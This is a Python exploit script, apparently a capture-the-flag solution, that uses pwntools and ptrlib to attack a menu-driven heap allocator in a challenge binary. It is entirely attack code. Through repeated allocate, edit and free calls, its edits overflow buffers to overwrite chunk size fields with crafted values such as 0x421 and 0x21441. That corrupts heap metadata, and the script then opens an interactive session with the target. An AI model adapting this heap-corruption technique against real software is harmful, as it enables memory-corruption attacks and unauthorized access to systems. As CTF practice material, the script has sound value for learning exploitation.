#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def alloc(sz: int) -> bytes:
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b": ", str(sz).encode())
        io.recvuntil(b"ID:")
        return io.recvuntil(b" allocated", drop=True)

    def edit(id: bytes, data: bytes):
        ptr.logger.warn("data should have '\\n' in the end")
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b": ", id)
        io.sendafter(b": ", data)
        return

    def release(id: bytes):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b": ", id)
        return

    pad = [*[alloc(0x400) for _ in range(2)]]
    id1 = alloc(0x120)
    edit(id1, b"A" * 0x118 + ptr.p64(0x421)[:-1])
    id2 = alloc(0x400)
    [release(p) for p in [*pad, id1, id2]]

    for _ in range(6):
        pad = alloc(0x400)
        i1 = alloc(0x3B0)
        edit(i1, b"B" * 0x3A8 + ptr.p64(0x421)[:-1])
        i2 = alloc(0x400)
        [release(p) for p in [pad, i1, i2]]

    pad = alloc(0x400)
    i1 = alloc(0x3B0)
    edit(i1, b"C" * 0x3A8 + ptr.p64(0x421)[:-1])
    i2 = alloc(0x400)
    edit(i1, b"D" * 0x3A8 + ptr.p64(0x21441)[:-1])

    for _ in range(7):
        release(alloc(0x3F0))

    print(f"{i2=}")
    edit(i2, ptr.p64(0x21440) + ptr.p64(0x40) + b"\n")
    alloc(0x400)

    io.interactive()
    return


if __name__ == "__main__":
    main()
